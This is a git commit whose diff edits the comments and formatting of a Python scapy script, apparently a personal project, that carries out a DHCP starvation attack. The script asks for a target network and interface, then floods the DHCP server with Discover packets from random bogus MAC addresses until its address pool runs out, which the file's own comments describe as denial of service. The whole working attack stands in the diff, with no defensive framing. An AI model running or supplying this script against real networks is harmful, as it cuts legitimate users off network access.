a396cf2c319ebf440da9e165f24c6ca5c1e6e643
mark <mrkgitonga387@gmail.com>
2024-12-19 13:09:53 +0300

    NEW DHCP COMPLEX

--- new_dhcp_exhaution_complex.py
+++ new_dhcp_exhaution_complex.py
@@ -4,13 +4,12 @@ from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
 from time import sleep
 import ipaddress
 
-# conf.checkIPaddr needs to be set to False. Answer will only be accepted by scapy when it is set to false.
-# When conf.checkIPaddr is set to False, we do not require the IPs to be swapped to count as a response.
+# Disable IP address checking as we don't need valid source IPs for this attack
 conf.checkIPaddr = False
 
 # Input for the network and interface
 network_input = input("Enter the network (e.g., 192.168.1.0/24): ")
-iface_input = input("Enter the network interface (e.g., eth0, wlan0,wlo1): ")
+iface_input = input("Enter the network interface (e.g., eth0, wlan0, wlo1): ")
 
 try:
     # Validate and convert the network input into an IPv4Network object
@@ -20,34 +19,37 @@ except ValueError:
     exit()
 
 # Create a DHCP starvation attack.
-# Create packets with unique bogus MAC Addresses and use them to ask for IP Addresses.
-# This will lead to a Denial of Service Attack (DoS) as the DHCP server will not be able to give out more IP Addresses.
+# This sends requests with unique bogus MAC addresses to exhaust the DHCP server's available IPs.
 
 for ip_add in possible_ips:
-    # RandMAC() creates random MAC Addresses.
+    # RandMAC() creates random MAC addresses.
     bog_src_mac = RandMAC()
 
     # Build DHCP Discover Packet
-    # We need to send a packet that broadcasts random MAC Addresses. We assign the bogus MAC Address as the source MAC Address.
+    # Create an Ethernet frame to broadcast the DHCP Discover packet to all devices
     broadcast = Ether(src=bog_src_mac, dst="ff:ff:ff:ff:ff:ff")
-    ip = IP(src="0.0.0.0", dst="255.255.255.255")
+    ip = IP(src="0.0.0.0", dst="255.255.255.255")  # Source IP 0.0.0.0, destination IP broadcast address
 
-    # For UDP -> sport is the random port of origin -> The server sends DHCP messages to UDP port 68 (Which is used for the DHCP Client / Bootstrap Protocol Client).
-    # For UDP -> dport is the destination port -> The client sends DHCP messages to UDP port 67 (Which is used for the DHCP Server / Bootstrap Protocol Server).
+    # For UDP -> sport is the random port of origin, and dport is the DHCP server's port (67)
     udp = UDP(sport=68, dport=67)
 
-    # The opcode of 1 says that it is a boot request. The client hardware address is assigned a random MAC Address. BootP is the predecessor of DHCP.
+    # BOOTP (Bootstrap Protocol) message for DHCP; we use op=1 for the DHCP Discover packet
     bootp = BOOTP(op=1, chaddr=bog_src_mac)
 
-    # We want to send a DHCP discover message. This packet will ask for an IP Address from the DHCP server.
+    # The DHCP Discover message, requesting an IP address and containing other DHCP options
     dhcp = DHCP(
-        options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "192.168.1.249"), ('end')])
+        options=[("message-type", "discover"),
+                 ("requested_addr", ip_add),
+                 ("server-id", "192.168.1.249"),  # You may need to adjust this based on your environment
+                 ('end')])
 
+    # Combine all parts into a single packet
     pkt = broadcast / ip / udp / bootp / dhcp
 
-    # The DHCP operates on Layer 2 of the OSI model so we should use sendp to send the segment.
+    # Send the packet on the specified interface (Layer 2 - Ethernet)
     sendp(pkt, iface=iface_input, verbose=0)
 
-    # Send out a new packet every 0.4 seconds
+    # Sleep for 0.4 seconds between sending packets
     sleep(0.4)
     print(f"Sending packet - {ip_add} via interface {iface_input}")
+
